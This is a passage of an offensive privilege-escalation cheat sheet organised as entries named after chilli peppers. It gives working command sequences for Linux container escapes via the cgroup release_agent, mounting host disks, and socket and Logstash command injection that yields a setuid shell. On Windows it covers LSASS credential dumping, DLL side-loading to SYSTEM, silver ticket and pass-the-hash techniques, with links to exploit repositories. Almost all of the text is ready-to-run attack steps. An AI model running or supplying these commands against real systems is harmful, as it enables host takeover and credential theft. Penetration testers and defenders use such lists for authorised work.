-   d=\`dirname \$(ls -x /s\*/fs/c\*/\*/r\* \|head -n1)\`

-   mkdir -p \$d/w; echo 1 \> \$d/w/notify_on_release

-   t=\`sed -n \'s/.\*\\perdir=\\(\[\^,\]\*\\).\*/\\1/p\' /etc/mtab\`

-   touch /o; echo \$t/c \> \$d/release_agent

-   echo \"\#!/bin/sh\" \> /c

-   echo \"ps \> \$t/o\" \>\> /c

-   chmod +x /c

-   sh -c \"echo 0 \> \$d/w/cgroup.procs\"; sleep 1

-   cat /o

<!-- TOC --><a name="escape-only-with-cap_sys_admin-capability"></a>
# Escape only with CAP_SYS_ADMIN capability

Domain: No

Local Admin: Yes

OS: Linux

Type: Abusing Capabilities

Methods:

-   mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir
    > /tmp/cgrp/x

-   echo 1 \> /tmp/cgrp/x/notify_on_release

-   host_path=\`sed -n \'s/.\*\\perdir=\\(\[\^,\]\*\\).\*/\\1/p\'
    > /etc/mtab\`

-   echo \"\$host_path/cmd\" \> /tmp/cgrp/release_agent

-   echo \"\#!/bin/sh\" \> /cmd

-   echo \"ps aux \> \$host_path/output\" \>\> /cmd

-   chmod a+x /cmd

-   sh -c \"echo \\\$\\\$ \> /tmp/cgrp/x/cgroup.procs\"

-   cat /output

<!-- TOC --><a name="abusing-exposed-host-directories"></a>
# Abusing exposed host directories

Domain: No

Local Admin: Yes

OS: Linux

Type: Abusing Capabilities

Methods:

-   mknod /dev/sdb1 block 8 17

-   mkdir /mnt/host_home

-   mount /dev/sdb1 /mnt/host_home

-   echo \'echo \"Hello from container land!\" 2\>&1\' \>\>
    > /mnt/host_home/eric_chiang_m/.bashrc

# 

<!-- TOC --><a name="unix-wildcard"></a>
# Unix Wildcard

Domain: No

Local Admin: Yes

OS: Linux

Type: Injection

Methods:

-   python wildpwn.py \--file /tmp/very_secret_file combined ./pwn_me/

<!-- TOC --><a name="socket-command-injection"></a>
# Socket Command Injection

Domain: No

Local Admin: Yes

OS: Linux

Type: Injection

Methods:

-   echo \"cp /bin/bash /tmp/bash; chmod +s /tmp/bash; chmod +x
    > /tmp/bash;\" \| socat - UNIX-CLIENT:/tmp/socket_test.s

<!-- TOC --><a name="logstash"></a>
# Logstash

Domain: No

Local Admin: Yes

OS: Linux

Type: Injection

Methods:

-   /etc/logstash/logstash.yml

-   input {

> exec {

command =\> \"whoami\"

interval =\> 120

}

}

<!-- TOC --><a name="usodllloader"></a>
# UsoDllLoader

Domain: No

Local Admin: Yes

OS: Linux

Type: Injection

Methods:

-   UsoDllLoader.exe

<!-- TOC --><a name="trend-chain-methods-for-privilege-escalation"></a>
# Trend Chain Methods for Privilege Escalation 

<!-- TOC --><a name="habanero-chilli"></a>
# Habanero Chilli

Domain: No

Local Admin: Yes

OS: Windows

Type: Dll Side-loading

Methods:

-   rundll32.exe C:\\Dumpert\\Outflank-Dumpert.dll,Dump

<!-- TOC --><a name="padron-chilli"></a>
# Padron Chilli

Domain: Y/N

Local Admin: Yes

OS: Windows

Type: Create a Reflective DLL Injector + Reflective DLL for dump lsass
memory without touch hard disk

Methods:

-   \#.\\inject.x64.exe \<Path to reflective dll:
    > .\\LsassDumpReflectiveDLL.dll\>

<!-- TOC --><a name="jalapeno-chillies"></a>
# Jalapeno Chillies

Domain: Yes

Local Admin: Yes

OS: Windows

Methods: unhook NTDLL.dll + dump the lsass.exe as
WindowsUpdateProvider.pod

Methods:

-   NihilistGuy.exe

<!-- TOC --><a name="pasilla-chili"></a>
# Pasilla Chili

Domain: Yes

Local Admin: Yes

OS: Windows

Methods: SeImpersonatePrivilege + Abusing Service Account Session

Methods:

-   [[https://github.com/tyranid/blackhat-usa-2022-demos]{.ul}](https://github.com/tyranid/blackhat-usa-2022-demos)

-   Demo5.ps1

<!-- TOC --><a name="finger-chilli"></a>
# Finger Chilli

Domain: No

Local Admin: Yes

OS: Windows

Type: Abusing PrintNotify Service + DLL side-loading

Methods:

-   As an administrator, copy winspool.drv and
    > mod-ms-win-core-apiquery-l1-1-0.dll to
    > C:\\Windows\\System32\\spool\\drivers\\x64\\3\\

-   Place all files which included in /bin/ into a same directory.

-   Then, run powershell . .\\spooltrigger.ps1.

-   Enjoy a shell as NT AUTHORITY\\SYSTEM.

<!-- TOC --><a name="orange-cayenne"></a>
# Orange Cayenne

Domain: Yes

Local Admin: Yes

OS: Windows

Type: Silver Ticket + I Know

Methods:

-   [[https://github.com/tyranid/blackhat-usa-2022-demos]{.ul}](https://github.com/tyranid/blackhat-usa-2022-demos)

-   Demo1.ps1

<!-- TOC --><a name="red-cayenne"></a>
# Red Cayenne

Domain: Yes

Local Admin: Yes

OS: Windows

Type: Silver ticket + User to User Authentication

Methods:

-   [[https://github.com/tyranid/blackhat-usa-2022-demos]{.ul}](https://github.com/tyranid/blackhat-usa-2022-demos)

-   demo2.ps1

<!-- TOC --><a name="birds-eye-chilli"></a>
# Birds Eye Chilli

Domain: Yes

Local Admin: Yes

OS: Windows

Type: Silver Ticket + Buffer Type Confusion

Methods:

-   [[https://github.com/tyranid/blackhat-usa-2022-demos]{.ul}](https://github.com/tyranid/blackhat-usa-2022-demos)

-   Demo3.ps1

<!-- TOC --><a name="scotch-bonnet"></a>
# Scotch Bonnet

Domain: Yes

Local Admin: Yes

OS: Windows

Type: Bring Your Own KDC

Methods:

-   [[https://github.com/tyranid/blackhat-usa-2022-demos]{.ul}](https://github.com/tyranid/blackhat-usa-2022-demos)

-   Demo4.ps1

<!-- TOC --><a name="lemon-habanero"></a>
# Lemon Habanero

Domain: No

Local Admin: Yes

OS: Linux

Type: Capabilities

Methods:

-   gcc -Wl,\--no-as-needed -lcap-ng -o ambient ambient.c

-   sudo setcap cap_setpcap,cap_net_raw,cap_net_admin,cap_sys_nice+eip
    > ambient

-   ./ambient /bin/bash

<!-- TOC --><a name="red-habanero"></a>
# Red Habanero

Domain: No

Local Admin: Yes

OS: Windows

Type: NtSetInformationProcess + DLL side-loading

Methods:

-   BypassRtlSetProcessIsCritical.exe pid

<!-- TOC --><a name="ghost-pepper"></a>
# Ghost Pepper

Domain: No

Local Admin: Yes

OS: Windows

Type: Directory-Deletion + Windows Media Player d/s

Methods:

-   https://github.com/sailay1996/delete2SYSTEM

-   .\\poc.ps1

<!-- TOC --><a name="chocolate-scorpion-chilli"></a>
# Chocolate Scorpion Chilli

Domain: No

Local Admin: Yes

OS: Windows

Type: Directory-Deletion + Windows Media Player d/s

Methods:

-   https://github.com/sailay1996/delete2SYSTEM

-   .\\poc.ps1

<!-- TOC --><a name="carolina-reaper"></a>
# Carolina Reaper

Domain: Yes

Local Admin: Yes

OS: Windows

Type: Creates an arbitrary service + PTH

Methods:

-   [[https://github.com/tyranid/blackhat-usa-2022-demos]{.ul}](https://github.com/tyranid/blackhat-usa-2022-demos)

-   Demo6.ps1

<!-- TOC --><a name="the-intimidator-chilli"></a>
# The Intimidator Chilli

Domain: No

Local Admin: Yes

OS: Windows

Type: manipulate memory/process token values/NT system calls and
objects/NT object manager

Methods:

-   https://github.com/googleprojectzero/sandbox-attacksurface-analysis-tools

-   Import-Module NtObjectManager

-   Get-ChildItem NtObject:\\

-   NT\*
